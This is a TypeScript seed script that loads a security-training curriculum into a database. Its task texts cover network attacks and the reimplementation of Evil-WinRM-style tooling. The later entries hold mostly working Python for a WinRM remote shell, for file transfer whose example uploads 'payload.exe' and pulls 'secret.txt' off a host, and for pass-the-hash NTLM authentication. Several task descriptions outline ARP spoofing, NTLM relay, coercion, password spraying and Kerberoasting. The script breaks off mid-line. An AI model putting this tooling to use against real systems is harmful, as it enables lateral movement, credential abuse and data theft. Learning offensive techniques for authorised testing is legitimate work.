import Database from 'better-sqlite3';

const db = new Database('data/quest-log.db');

const insertModule = db.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = db.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);
const deleteModules = db.prepare('DELETE FROM modules WHERE path_id = ?');

const now = Date.now();

function expandPath(pathId: number, modules: { name: string; desc: string; tasks: [string, string, string][] }[]) {
	deleteModules.run(pathId);
	modules.forEach((mod, i) => {
		const m = insertModule.run(pathId, mod.name, mod.desc, i, now);
		mod.tasks.forEach(([title, desc, details], j) => {
			insertTask.run(m.lastInsertRowid, title, desc, details, j, now);
		});
	});
}

// Reimplement Red Team Tools: Network (61)
expandPath(61, [
	{ name: 'Network Reconnaissance', desc: 'Discovery and enumeration', tasks: [
		['Build network scanner', 'Discover live hosts using ICMP ping sweeps (ping -c 1 target), ARP scanning for local networks, and TCP connect scans to common ports like 22, 80, 443, 445. Example: scan 192.168.1.0/24 and identify which hosts respond.', '## Scanner\n\nPing sweep\nARP scan\nTCP connect scan'],
		['Implement service detection', 'Identify services by connecting to open ports and analyzing response banners. Example: connect to port 22 and parse "SSH-2.0-OpenSSH_8.2" to identify SSH version, or send HTTP requests to detect web server types like Apache/nginx.', '## Services\n\nConnect to ports\nSend probes\nIdentify services'],
		['Add DNS enumeration', 'Enumerate DNS using zone transfer attempts (AXFR), subdomain brute-forcing with wordlists (admin., dev., staging.), and record lookups for MX, TXT, CNAME, and SRV records to map the target infrastructure.', '## DNS\n\nSubdomain brute\nZone transfer attempt\nDNS record lookup'],
		['Build SNMP scanner', 'Test SNMP community strings like "public", "private", "community" on UDP 161. Walk MIB trees (1.3.6.1.2.1.1) to extract hostnames, interfaces, running processes, and installed software from network devices.', '## SNMP\n\nTest default communities\nWalk MIB tree\nExtract system info'],
		['Implement SMB enumeration', 'Connect to SMB (port 445) using null sessions to list shares (ADMIN$, C$, IPC$), enumerate domain users via RID cycling (500=Administrator, 1000+ users), and identify accessible file shares.', '## SMB\n\nList shares\nNull session enum\nUser enumeration'],
		['Add LDAP enumeration', 'Query LDAP (port 389/636) with anonymous or authenticated binds. Extract users (sAMAccountName, mail), groups (Domain Admins, Enterprise Admins), GPOs (displayName, gPCFileSysPath), and computer objects.', '## LDAP\n\nAnonymous bind\nUser/group enum\nGPO enumeration'],
	] as [string, string, string][] },
	{ name: 'Network Attacks', desc: 'Exploitation tools', tasks: [
		['Build ARP spoofer', 'Perform MITM by sending gratuitous ARP replies to poison victim ARP caches. Example: tell 192.168.1.100 that the gateway 192.168.1.1 is at attacker MAC, intercept traffic, then forward to real gateway to avoid detection.', '## ARP Spoof\n\nPoison ARP cache\nIntercept traffic\nForward packets'],
		['Implement packet capture', 'Use libpcap to capture traffic with BPF filters like "tcp port 21 or port 110" to extract FTP/POP3 credentials. Parse HTTP POST data for login forms, and extract NTLM hashes from SMB traffic.', '## Capture\n\nPcap library\nFilter traffic\nExtract credentials'],
		['Add password sprayer', 'Test one password against many accounts to avoid lockouts. Example: try "Winter2024!" against all domain users via SMB (port 445), LDAP bind, or Kerberos AS-REQ. Implement lockout-aware delays between attempts.', '## Sprayer\n\nSMB spray\nLDAP spray\nKerberos spray'],
		['Build relay tool', 'Capture NTLM Type 1/2/3 messages from one connection and relay them to another service. Example: victim connects to attacker SMB, attacker relays to target LDAP to add a computer account or modify ACLs.', '## Relay\n\nCapture NTLM\nRelay to target\nExecute commands'],
		['Implement coercer', 'Force Windows machines to authenticate to attacker using RPC calls. PrinterBug: MS-RPRN RpcRemoteFindFirstPrinterChangeNotification. PetitPotam: MS-EFSRPC EfsRpcOpenFileRaw. Combine with relay for exploitation.', '## Coercer\n\nPrinterbug\nPetitPotam\nDFSCoerce'],
		['Add Kerberos attacks', 'Kerberoast: find SPNs with LDAP, request TGS tickets, crack offline with hashcat -m 13100. AS-REP Roast: find users without preauth (UAC 0x400000), request AS-REP, crack with hashcat -m 18200.', '## Kerberos\n\nRequest TGTs\nCrack offline\nForge tickets'],
	] as [string, string, string][] },
]);

// Reimplement: Evil-WinRM & C2 (89)
expandPath(89, [
	{ name: 'WinRM Client', desc: 'PowerShell remoting', tasks: [
		['Implement WinRM protocol', 'Build HTTP(S) transport on ports 5985/5986 using SOAP envelopes. Construct WS-Management messages with proper headers (wsa:Action, wsa:To) and WSMAN shell operations (Create, Command, Receive, Delete).', `## Overview

WinRM (Windows Remote Management) is Microsoft's implementation of WS-Management, enabling remote management of Windows systems. It uses SOAP over HTTP(S) for transport, making it firewall-friendly and widely deployed in enterprise environments.

### Protocol Architecture

\`\`\`
┌─────────────────────────────────────────────────────────┐
│                    WinRM Protocol Stack                  │
├─────────────────────────────────────────────────────────┤
│  PowerShell Remoting (PSRP) - Serialized commands       │
├─────────────────────────────────────────────────────────┤
│  WS-Management Shell - Create/Command/Receive/Delete    │
├─────────────────────────────────────────────────────────┤
│  SOAP/WS-Management - XML envelope with headers         │
├─────────────────────────────────────────────────────────┤
│  HTTP(S) - Port 5985 (HTTP) / 5986 (HTTPS)             │
└─────────────────────────────────────────────────────────┘
\`\`\`

### Core Implementation

\`\`\`python
import requests
import uuid
from base64 import b64encode
from xml.etree import ElementTree as ET

class WinRMClient:
    """WinRM client implementing WS-Management protocol"""

    NAMESPACES = {
        'soap': 'http://www.w3.org/2003/05/soap-envelope',
        'wsa': 'http://schemas.xmlsoap.org/ws/2004/08/addressing',
        'wsman': 'http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd',
        'wsen': 'http://schemas.xmlsoap.org/ws/2004/09/enumeration',
        'rsp': 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell'
    }

    SHELL_RESOURCE = 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd'
    PS_RESOURCE = 'http://schemas.microsoft.com/powershell/Microsoft.PowerShell'

    def __init__(self, host: str, username: str, password: str,
                 port: int = 5985, ssl: bool = False):
        self.host = host
        self.port = port
        self.ssl = ssl
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.auth = (username, password)
        self.shell_id = None

    @property
    def endpoint(self) -> str:
        protocol = 'https' if self.ssl else 'http'
        return f"{protocol}://{self.host}:{self.port}/wsman"

    def _build_envelope(self, action: str, resource_uri: str,
                        body: str = '', shell_id: str = None) -> str:
        """Build SOAP envelope with WS-Management headers"""

        message_id = f"uuid:{uuid.uuid4()}"

        headers = f'''
        <wsa:To>{self.endpoint}</wsa:To>
        <wsman:ResourceURI>{resource_uri}</wsman:ResourceURI>
        <wsa:ReplyTo>
            <wsa:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wsa:Action>{action}</wsa:Action>
        <wsa:MessageID>{message_id}</wsa:MessageID>
        <wsman:MaxEnvelopeSize>153600</wsman:MaxEnvelopeSize>
        <wsman:OperationTimeout>PT60S</wsman:OperationTimeout>
        '''

        if shell_id:
            headers += f'''
            <wsman:SelectorSet>
                <wsman:Selector Name="ShellId">{shell_id}</wsman:Selector>
            </wsman:SelectorSet>
            '''

        envelope = f'''<?xml version="1.0" encoding="UTF-8"?>
        <soap:Envelope
            xmlns:soap="{self.NAMESPACES['soap']}"
            xmlns:wsa="{self.NAMESPACES['wsa']}"
            xmlns:wsman="{self.NAMESPACES['wsman']}"
            xmlns:rsp="{self.NAMESPACES['rsp']}">
            <soap:Header>{headers}</soap:Header>
            <soap:Body>{body}</soap:Body>
        </soap:Envelope>'''

        return envelope

    def create_shell(self) -> str:
        """Create a new command shell (wsman:Create)"""

        body = '''
        <rsp:Shell>
            <rsp:InputStreams>stdin</rsp:InputStreams>
            <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
        </rsp:Shell>
        '''

        envelope = self._build_envelope(
            action='http://schemas.xmlsoap.org/ws/2004/09/transfer/Create',
            resource_uri=self.SHELL_RESOURCE,
            body=body
        )

        response = self.session.post(
            self.endpoint,
            data=envelope,
            headers={'Content-Type': 'application/soap+xml;charset=UTF-8'}
        )

        # Parse ShellId from response
        root = ET.fromstring(response.text)
        shell_id = root.find('.//{%s}ShellId' % self.NAMESPACES['rsp'])
        self.shell_id = shell_id.text
        return self.shell_id

    def execute_command(self, command: str) -> str:
        """Execute command in shell (wsman:Command)"""

        body = f'''
        <rsp:CommandLine>
            <rsp:Command>"{command}"</rsp:Command>
        </rsp:CommandLine>
        '''

        envelope = self._build_envelope(
            action='http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command',
            resource_uri=self.SHELL_RESOURCE,
            body=body,
            shell_id=self.shell_id
        )

        response = self.session.post(
            self.endpoint,
            data=envelope,
            headers={'Content-Type': 'application/soap+xml;charset=UTF-8'}
        )

        root = ET.fromstring(response.text)
        command_id = root.find('.//{%s}CommandId' % self.NAMESPACES['rsp'])
        return command_id.text

    def receive_output(self, command_id: str) -> tuple:
        """Receive command output (wsman:Receive)"""

        body = f'''
        <rsp:Receive>
            <rsp:DesiredStream CommandId="{command_id}">stdout stderr</rsp:DesiredStream>
        </rsp:Receive>
        '''

        envelope = self._build_envelope(
            action='http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive',
            resource_uri=self.SHELL_RESOURCE,
            body=body,
            shell_id=self.shell_id
        )

        response = self.session.post(
            self.endpoint,
            data=envelope,
            headers={'Content-Type': 'application/soap+xml;charset=UTF-8'}
        )

        # Parse stdout and stderr from response
        root = ET.fromstring(response.text)
        stdout = self._extract_stream(root, 'stdout')
        stderr = self._extract_stream(root, 'stderr')

        return stdout, stderr

    def delete_shell(self):
        """Delete shell session (wsman:Delete)"""

        envelope = self._build_envelope(
            action='http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete',
            resource_uri=self.SHELL_RESOURCE,
            shell_id=self.shell_id
        )

        self.session.post(
            self.endpoint,
            data=envelope,
            headers={'Content-Type': 'application/soap+xml;charset=UTF-8'}
        )
        self.shell_id = None
\`\`\`

### Key Concepts

- **WS-Management Operations**: Create (new shell), Command (execute), Receive (get output), Delete (cleanup)
- **SOAP Headers**: wsa:Action identifies the operation, wsman:ResourceURI specifies target (cmd or PowerShell)
- **Shell Lifecycle**: Always create before executing, always delete when done to free server resources
- **Authentication**: Supports Basic, NTLM, Kerberos via HTTP auth headers

### Practice Tasks

- [ ] Implement basic HTTP WinRM connection with NTLM auth
- [ ] Build SOAP envelope construction with all required headers
- [ ] Implement Create shell operation and parse ShellId response
- [ ] Add Command execution with CommandId tracking
- [ ] Implement Receive for streaming stdout/stderr
- [ ] Add Delete for proper session cleanup
- [ ] Handle HTTPS with certificate validation options
- [ ] Add connection timeout and retry logic

### Completion Criteria

- [ ] Successfully connect to Windows host on port 5985/5986
- [ ] Create and delete shell sessions properly
- [ ] Execute commands and retrieve full output
- [ ] Handle authentication errors gracefully
- [ ] Support both HTTP and HTTPS transports`],
		['Build shell interface', 'Create interactive PowerShell sessions that send commands, stream output in real-time, handle CLIXML error formatting, and support tab completion. Implement proper session cleanup on exit.', `## Overview

Build an interactive shell interface on top of the WinRM protocol that provides a seamless PowerShell experience. This includes real-time output streaming, proper CLIXML error parsing, command history, and tab completion.

### Architecture

\`\`\`
┌─────────────────────────────────────────────────────────┐
│                  Interactive Shell                       │
├───────────────┬─────────────────┬───────────────────────┤
│  Input Loop   │  Output Parser  │  Completion Engine    │
│  - Readline   │  - CLIXML       │  - Tab complete       │
│  - History    │  - Stream merge │  - File paths         │
│  - Signals    │  - Error format │  - Cmdlet names       │
└───────────────┴─────────────────┴───────────────────────┘
\`\`\`

### Implementation

\`\`\`python
import sys
import re
import threading
from typing import Optional, Callable
import readline  # For command history
from xml.etree import ElementTree as ET
from base64 import b64decode

class PowerShellSession:
    """Interactive PowerShell session over WinRM"""

    def __init__(self, winrm_client):
        self.client = winrm_client
        self.shell_id = None
        self.running = False
        self.prompt = "PS > "
        self.history_file = ".winrm_history"

    def start(self):
        """Start interactive session"""
        self.shell_id = self.client.create_shell()
        self.running = True
        self._setup_readline()

        print(f"[*] Connected to {self.client.host}")
        print("[*] Type 'exit' to disconnect\\n")

        try:
            self._interactive_loop()
        finally:
            self._cleanup()

    def _setup_readline(self):
        """Configure readline for history and completion"""
        try:
            readline.read_history_file(self.history_file)
        except FileNotFoundError:
            pass

        readline.set_history_length(1000)
        readline.parse_and_bind('tab: complete')
        readline.set_completer(self._tab_completer)

    def _tab_completer(self, text: str, state: int) -> Optional[str]:
        """Tab completion for PowerShell cmdlets and paths"""

        # Common PowerShell cmdlets
        cmdlets = [
            'Get-Process', 'Get-Service', 'Get-ChildItem', 'Get-Content',
            'Set-Location', 'Set-Item', 'Set-Content', 'Set-ExecutionPolicy',
            'Invoke-Command', 'Invoke-Expression', 'Invoke-WebRequest',
            'New-Object', 'New-Item', 'New-PSDrive',
            'Remove-Item', 'Remove-Variable',
            'Start-Process', 'Stop-Process', 'Start-Service', 'Stop-Service',
            'Write-Output', 'Write-Host', 'Write-Error',
            'Import-Module', 'Export-Csv', 'ConvertTo-Json', 'ConvertFrom-Json'
        ]

        matches = [c for c in cmdlets if c.lower().startswith(text.lower())]

        if state < len(matches):
            return matches[state]
        return None

    def _interactive_loop(self):
        """Main input loop"""
        while self.running:
            try:
                command = input(self.prompt)

                if not command.strip():
                    continue

                if command.strip().lower() == 'exit':
                    break

                # Execute and stream output
                stdout, stderr = self._execute_with_streaming(command)

                if stdout:
                    print(stdout, end='')
                if stderr:
                    self._print_error(stderr)

            except KeyboardInterrupt:
                print("\\n[*] Use 'exit' to disconnect")
            except EOFError:
                break

    def _execute_with_streaming(self, command: str) -> tuple:
        """Execute command and collect streamed output"""

        # Wrap in PowerShell for better output handling
        ps_command = f'powershell.exe -NoProfile -NonInteractive -Command "{command}"'

        command_id = self.client.execute_command(ps_command)

        stdout_buffer = []
        stderr_buffer = []
        done = False

        while not done:
            stdout, stderr, state = self.client.receive_output(command_id)

            if stdout:
                decoded = self._decode_output(stdout)
                stdout_buffer.append(decoded)
                # Stream to terminal in real-time
                print(decoded, end='', flush=True)

            if stderr:
                stderr_buffer.append(self._parse_clixml_error(stderr))

            done = state == 'Done'

        return ''.join(stdout_buffer), ''.join(stderr_buffer)

    def _decode_output(self, data: str) -> str:
        """Decode Base64 output from WinRM response"""
        try:
            return b64decode(data).decode('utf-8', errors='replace')
        except:
            return data

    def _parse_clixml_error(self, clixml: str) -> str:
        """Parse PowerShell CLIXML error format"""

        # CLIXML format: <Objs Version="1.1.0.1" ...><S S="Error">message</S></Objs>
        try:
            decoded = self._decode_output(clixml)

            # Remove CLIXML wrapper
            if decoded.startswith('#< CLIXML'):
                decoded = decoded[9:]

            root = ET.fromstring(decoded)

            # Extract error messages
            errors = []
            for elem in root.iter():
                if elem.get('S') == 'Error' or elem.tag.endswith('S'):
                    if elem.text:
                        errors.append(elem.text.strip())

            return '\\n'.join(errors) if errors else decoded

        except Exception:
            return clixml

    def _print_error(self, error: str):
        """Print error with formatting"""
        # Red color for errors
        print(f"\\033[91m{error}\\033[0m", file=sys.stderr)

    def _cleanup(self):
        """Clean up session resources"""
        if self.shell_id:
            try:
                self.client.delete_shell()
            except:
                pass

        try:
            readline.write_history_file(self.history_file)
        except:
            pass

        print("\\n[*] Session closed")


# Usage example
if __name__ == '__main__':
    client = WinRMClient('192.168.1.100', 'admin', 'password')
    session = PowerShellSession(client)
    session.start()
\`\`\`

### Key Concepts

- **CLIXML**: PowerShell serialization format for objects/errors - parse to extract meaningful messages
- **Output Streaming**: Poll Receive endpoint repeatedly until state is "Done"
- **Readline Integration**: Provides history (up/down arrows) and tab completion
- **Signal Handling**: Catch Ctrl+C without terminating the connection

### Practice Tasks

- [ ] Implement basic input loop with readline history
- [ ] Add CLIXML error parsing for meaningful error messages
- [ ] Build output streaming that displays results in real-time
- [ ] Implement tab completion for common PowerShell cmdlets
- [ ] Add support for multi-line input (script blocks)
- [ ] Handle special characters and Unicode properly
- [ ] Add session timeout detection and reconnection

### Completion Criteria

- [ ] Interactive shell feels responsive and native
- [ ] Command history persists between sessions
- [ ] Errors are clearly formatted and readable
- [ ] Tab completion works for cmdlets
- [ ] Clean disconnect without orphaned shells`],
		['Add file transfer', 'Upload files by Base64 encoding and writing via PowerShell: [IO.File]::WriteAllBytes(). Download by reading and encoding. Chunk large files (>1MB) to avoid memory issues. Show transfer progress.', `## Overview

Implement file transfer capabilities over WinRM using Base64 encoding. Since WinRM doesn't have native file transfer, we use PowerShell commands to encode/decode file contents and transfer them as text within command responses.

### Transfer Architecture

\`\`\`
Upload Flow:
┌────────┐   Base64    ┌────────┐  [IO.File]::  ┌────────┐
│ Local  │ ──encode──▶ │ WinRM  │ ──WriteAll──▶ │ Remote │
│ File   │   chunks    │ SOAP   │    Bytes()    │ File   │
└────────┘             └────────┘               └────────┘

Download Flow:
┌────────┐  [IO.File]:: ┌────────┐   Base64    ┌────────┐
│ Remote │ ──ReadAll──▶ │ WinRM  │ ──decode──▶ │ Local  │
│ File   │   Bytes()    │ SOAP   │   chunks    │ File   │
└────────┘              └────────┘             └────────┘
\`\`\`

### Implementation

\`\`\`python
import os
import sys
from base64 import b64encode, b64decode
from typing import Generator, Callable
import hashlib

class WinRMFileTransfer:
    """File transfer over WinRM using Base64 encoding"""

    # Chunk size for large files (1MB = safe for most WinRM configs)
    CHUNK_SIZE = 1024 * 1024  # 1 MB

    def __init__(self, winrm_client):
        self.client = winrm_client

    def upload(self, local_path: str, remote_path: str,
               progress_callback: Callable = None) -> bool:
        """Upload file to remote system"""

        if not os.path.exists(local_path):
            raise FileNotFoundError(f"Local file not found: {local_path}")

        file_size = os.path.getsize(local_path)

        if file_size <= self.CHUNK_SIZE:
            return self._upload_small(local_path, remote_path)
        else:
            return self._upload_chunked(local_path, remote_path, progress_callback)

    def _upload_small(self, local_path: str, remote_path: str) -> bool:
        """Upload small file in single transfer"""

        with open(local_path, 'rb') as f:
            content = b64encode(f.read()).decode('ascii')

        # PowerShell command to decode and write
        ps_cmd = f'''
        $bytes = [Convert]::FromBase64String("{content}")
        [IO.File]::WriteAllBytes("{remote_path}", $bytes)
        Write-Output "OK"
        '''

        stdout, stderr = self.client.run_command(ps_cmd)
        return 'OK' in stdout and not stderr

    def _upload_chunked(self, local_path: str, remote_path: str,
                        progress_callback: Callable = None) -> bool:
        """Upload large file in chunks with progress"""

        file_size = os.path.getsize(local_path)
        uploaded = 0
        chunk_num = 0

        with open(local_path, 'rb') as f:
            while True:
                chunk = f.read(self.CHUNK_SIZE)
                if not chunk:
                    break

                content = b64encode(chunk).decode('ascii')

                if chunk_num == 0:
                    # First chunk: create/overwrite file
                    ps_cmd = f'''
                    $bytes = [Convert]::FromBase64String("{content}")
                    [IO.File]::WriteAllBytes("{remote_path}", $bytes)
                    '''
                else:
                    # Subsequent chunks: append
                    ps_cmd = f'''
                    $bytes = [Convert]::FromBase64String("{content}")
                    $stream = [IO.File]::Open("{remote_path}", [IO.FileMode]::Append)
                    $stream.Write($bytes, 0, $bytes.Length)
                    $stream.Close()
                    '''

                stdout, stderr = self.client.run_command(ps_cmd)

                if stderr:
                    raise Exception(f"Upload failed: {stderr}")

                uploaded += len(chunk)
                chunk_num += 1

                if progress_callback:
                    progress_callback(uploaded, file_size)

        # Verify upload with hash
        return self._verify_upload(local_path, remote_path)

    def _verify_upload(self, local_path: str, remote_path: str) -> bool:
        """Verify upload by comparing MD5 hashes"""

        # Local hash
        with open(local_path, 'rb') as f:
            local_hash = hashlib.md5(f.read()).hexdigest()

        # Remote hash
        ps_cmd = f'''
        $md5 = [System.Security.Cryptography.MD5]::Create()
        $bytes = [IO.File]::ReadAllBytes("{remote_path}")
        $hash = $md5.ComputeHash($bytes)
        [BitConverter]::ToString($hash) -replace '-'
        '''

        stdout, _ = self.client.run_command(ps_cmd)
        remote_hash = stdout.strip().lower()

        return local_hash.lower() == remote_hash

    def download(self, remote_path: str, local_path: str,
                 progress_callback: Callable = None) -> bool:
        """Download file from remote system"""

        # Get remote file size
        ps_cmd = f'(Get-Item "{remote_path}").Length'
        stdout, stderr = self.client.run_command(ps_cmd)

        if stderr or not stdout.strip().isdigit():
            raise FileNotFoundError(f"Remote file not found: {remote_path}")

        file_size = int(stdout.strip())

        if file_size <= self.CHUNK_SIZE:
            return self._download_small(remote_path, local_path)
        else:
            return self._download_chunked(remote_path, local_path,
                                          file_size, progress_callback)

    def _download_small(self, remote_path: str, local_path: str) -> bool:
        """Download small file in single transfer"""

        ps_cmd = f'''
        $bytes = [IO.File]::ReadAllBytes("{remote_path}")
        [Convert]::ToBase64String($bytes)
        '''

        stdout, stderr = self.client.run_command(ps_cmd)

        if stderr:
            raise Exception(f"Download failed: {stderr}")

        content = b64decode(stdout.strip())

        with open(local_path, 'wb') as f:
            f.write(content)

        return True

    def _download_chunked(self, remote_path: str, local_path: str,
                          file_size: int, progress_callback: Callable = None) -> bool:
        """Download large file in chunks"""

        downloaded = 0

        with open(local_path, 'wb') as f:
            while downloaded < file_size:
                remaining = file_size - downloaded
                chunk_size = min(self.CHUNK_SIZE, remaining)

                ps_cmd = f'''
                $stream = [IO.File]::OpenRead("{remote_path}")
                $stream.Position = {downloaded}
                $buffer = New-Object byte[] {chunk_size}
                $read = $stream.Read($buffer, 0, {chunk_size})
                $stream.Close()
                [Convert]::ToBase64String($buffer[0..($read-1)])
                '''

                stdout, stderr = self.client.run_command(ps_cmd)

                if stderr:
                    raise Exception(f"Download failed: {stderr}")

                chunk = b64decode(stdout.strip())
                f.write(chunk)

                downloaded += len(chunk)

                if progress_callback:
                    progress_callback(downloaded, file_size)

        return True


def progress_bar(current: int, total: int):
    """Display transfer progress bar"""
    percent = (current / total) * 100
    bar_len = 40
    filled = int(bar_len * current / total)
    bar = '=' * filled + '-' * (bar_len - filled)
    sys.stdout.write(f'\\r[{bar}] {percent:.1f}% ({current}/{total} bytes)')
    sys.stdout.flush()
    if current >= total:
        print()


# Usage example
transfer = WinRMFileTransfer(winrm_client)
transfer.upload('/local/payload.exe', 'C:\\\\Windows\\\\Temp\\\\payload.exe', progress_bar)
transfer.download('C:\\\\Users\\\\admin\\\\secret.txt', '/local/secret.txt', progress_bar)
\`\`\`

### Key Concepts

- **Base64 Encoding**: Only way to transfer binary data over text-based WinRM protocol
- **Chunking**: Essential for large files - avoid memory exhaustion and timeout issues
- **Hash Verification**: MD5/SHA256 to confirm successful transfer
- **Progress Feedback**: Important for large transfers to show activity

### Practice Tasks

- [ ] Implement small file upload using WriteAllBytes
- [ ] Add chunked upload with append mode for large files
- [ ] Implement download with ReadAllBytes and offset reading
- [ ] Add progress callback with percentage display
- [ ] Implement MD5 hash verification for uploads
- [ ] Handle transfer errors and resume capability
- [ ] Add recursive directory upload/download

### Completion Criteria

- [ ] Upload/download files of any size successfully
- [ ] Large file transfers (100MB+) work without timeout
- [ ] Progress bar shows accurate transfer status
- [ ] Hash verification confirms file integrity
- [ ] Handles special characters in paths`],
		['Implement pass-the-hash', 'Authenticate with NTLM hash (aad3b435:31d6cfe0) instead of password by constructing NTLM Type 3 response directly from hash. No plaintext password needed for lateral movement.', `## Overview

Pass-the-Hash (PtH) enables authentication using an NTLM hash instead of the plaintext password. This is critical for lateral movement after extracting hashes from memory or the SAM database. WinRM with NTLM auth is perfect for this technique.

### NTLM Authentication Flow

\`\`\`
Client                                    Server
  │                                          │
  │──── HTTP GET (no auth) ─────────────────▶│
  │◀─── 401 + WWW-Authenticate: Negotiate ───│
  │                                          │
  │──── Type 1 (Negotiate) ─────────────────▶│
  │◀─── Type 2 (Challenge) ──────────────────│
  │                                          │
  │──── Type 3 (Auth with hash) ────────────▶│
  │◀─── 200 OK ──────────────────────────────│
  │                                          │

Type 3 Response (constructed from hash, not password):
┌─────────────────────────────────────────────────────┐
│ NTLMSSP Signature │ Message Type (3) │ LM Response │
├─────────────────────────────────────────────────────┤
│ NT Response (from hash) │ Domain │ User │ Workstation │
└─────────────────────────────────────────────────────┘
\`\`\`

### Implementation

\`\`\`python
import struct
import hmac
import hashlib
from base64 import b64encode, b64decode
from typing import Tuple, Optional
import requests

class NTLMHashAuth:
    """NTLM authentication using NT hash instead of password"""

    NTLMSSP_SIGNATURE = b'NTLMSSP\\x00'

    def __init__(self, username: str, nt_hash: str, domain: str = ''):
        self.username = username
        self.domain = domain
        # Parse hash - format: "LM:NT" or just "NT"
        if ':' in nt_hash:
            self.lm_hash = bytes.fromhex(nt_hash.split(':')[0])
            self.nt_hash = bytes.fromhex(nt_hash.split(':')[1])
        else:
            self.lm_hash = b'\\x00' * 16  # Empty LM hash
            self.nt_hash = bytes.fromhex(nt_hash)

    def create_type1_message(self) -> bytes:
        """Create NTLM Type 1 (Negotiate) message"""

        # Negotiate flags
        flags = (
            0x00000001 |  # NEGOTIATE_UNICODE
            0x00000002 |  # NEGOTIATE_OEM
            0x00000004 |  # REQUEST_TARGET
            0x00000200 |  # NEGOTIATE_NTLM
            0x00008000 |  # NEGOTIATE_ALWAYS_SIGN
            0x00080000 |  # NEGOTIATE_NTLM2
            0x02000000 |  # NEGOTIATE_128
            0x20000000    # NEGOTIATE_56
        )

        message = (
            self.NTLMSSP_SIGNATURE +
            struct.pack('<I', 1) +       # Type 1
            struct.pack('<I', flags) +   # Flags
            struct.pack('<HHI', 0, 0, 0) +  # Domain (empty)
            struct.pack('<HHI', 0, 0, 0)    # Workstation (empty)
        )

        return message

    def parse_type2_message(self, type2_b64: str) -> Tuple[bytes, int]:
        """Parse Type 2 (Challenge) and extract challenge + flags"""

        data = b64decode(type2_b64)

        # Verify signature
        if not data.startswith(self.NTLMSSP_SIGNATURE):
            raise ValueError("Invalid NTLM message")

        # Parse challenge at offset 24, flags at offset 20
        flags = struct.unpack('<I', data[20:24])[0]
        challenge = data[24:32]

        return challenge, flags

    def create_type3_message(self, challenge: bytes, flags: int) -> bytes:
        """Create Type 3 (Authenticate) using NT hash directly"""

        # Calculate NTLMv2 response from hash
        nt_response = self._calculate_ntlmv2_response(challenge)

        # Encode strings as UTF-16LE
        domain_bytes = self.domain.upper().encode('utf-16le')
        user_bytes = self.username.encode('utf-16le')
        workstation_bytes = b''

        # Calculate offsets (header is 88 bytes)
        base_offset = 88
        domain_offset = base_offset
        user_offset = domain_offset + len(domain_bytes)
        workstation_offset = user_offset + len(user_bytes)
        lm_offset = workstation_offset + len(workstation_bytes)
        nt_offset = lm_offset + 24  # LM response is 24 bytes

        # Build Type 3 message
        message = (
            self.NTLMSSP_SIGNATURE +
            struct.pack('<I', 3) +  # Type 3
            # LM Response
            struct.pack('<HHI', 24, 24, lm_offset) +
            # NT Response
            struct.pack('<HHI', len(nt_response), len(nt_response), nt_offset) +
            # Domain
            struct.pack('<HHI', len(domain_bytes), len(domain_bytes), domain_offset) +
            # User
            struct.pack('<HHI', len(user_bytes), len(user_bytes), user_offset) +
            # Workstation
            struct.pack('<HHI', len(workstation_bytes), len(workstation_bytes), workstation_offset) +
            # Encrypted Random Session Key
            struct.pack('<HHI', 0, 0, 0) +
            # Flags
            struct.pack('<I', flags) +
            # Payload
            domain_bytes +
            user_bytes +
            workstation_bytes +
            (b'\\x00' * 24) +  # LM response (empty for NTLMv2)
            nt_response
        )

        return message

    def _calculate_ntlmv2_response(self, challenge: bytes) -> bytes:
        """Calculate NTLMv2 response using NT hash"""

        import os
        import time

        # NTLMv2 hash = HMAC-MD5(NT hash, UPPER(username) + domain)
        identity = (self.username.upper() + self.domain).encode('utf-16le')
        ntlmv2_hash = hmac.new(self.nt_hash, identity, hashlib.md5).digest()

        # Client challenge (random 8 bytes)
        client_challenge = os.urandom(8)

        # Build blob
        blob = (
            struct.pack('<I', 0x00000101) +  # Blob signature
            struct.pack('<I', 0) +            # Reserved
            struct.pack('<Q', int(time.time() * 10000000) + 116444736000000000) +  # Timestamp
            client_challenge +
            struct.pack('<I', 0)              # Unknown
        )

        # NTLMv2 response = HMAC-MD5(NTLMv2 hash, challenge + blob) + blob
        data = challenge + blob
        response = hmac.new(ntlmv2_hash, data, hashlib.md5).digest() + blob

        return response


class WinRMPtH:
    """WinRM client with Pass-the-Hash authentication"""

    def __init__(self, host: str, username: str, nt_hash: str,
                 domain: str = '', port: int = 5985):
        self.host = host
        self.port = port
        self.endpoint = f"http://{host}:{port}/wsman"
        self.ntlm = NTLMHashAuth(username, nt_hash, domain)
        self.session = requests.Session()

    def authenticate(self) -> bool:
        """Perform NTLM authentication with hash"""

        # Step 1: Initial request to get 401
        response = self.session.get(self.endpoint)

        if response.status_code != 401:
            return False

        # Step 2: Send Type 1
        type1 = self.ntlm.create_type1_message()
        response = self.session.get(
            self.endpoint,
            headers={'Authorization': f'Negotiate {b64encode(type1).decode()}'}
        )

        # Step 3: Parse Type 2 from response
        auth_header = response.headers.get('WWW-Authenticate', '')
        if not auth_header.startswith('Negotiate '):
            return False

        type2_b64 = auth_header.split(' ', 1)[1]
        challenge, flags = self.ntlm.parse_type2_message(type2_b64)

        # Step 4: Send Type 3 (calculated from hash, not password!)
        type3 = self.ntlm.create_type3_message(challenge, flags)
        response = self.session.post(
            self.endpoint,
            headers={
                'Authorization': f'Negotiate {b64encode(type3).decode()}',
                'Content-Type': 'application/soap+xml;charset=UTF-8'
            },
            data=self._build_test_envelope()
        )

        return response.status_code == 200

    def _build_test_envelope(self) -> str:
        # Minimal WS-Management identify request
        return '''<?xml version="1.0"?>
        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
            <soap:Header/>
            <soap:Body/>
        </soap:Envelope>'''


# Usage - authenticate with hash instead of password
client = WinRMPtH(
    host='192.168.1.100',
    username='Administrator',
    nt_hash='aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0',
    domain='CORP'
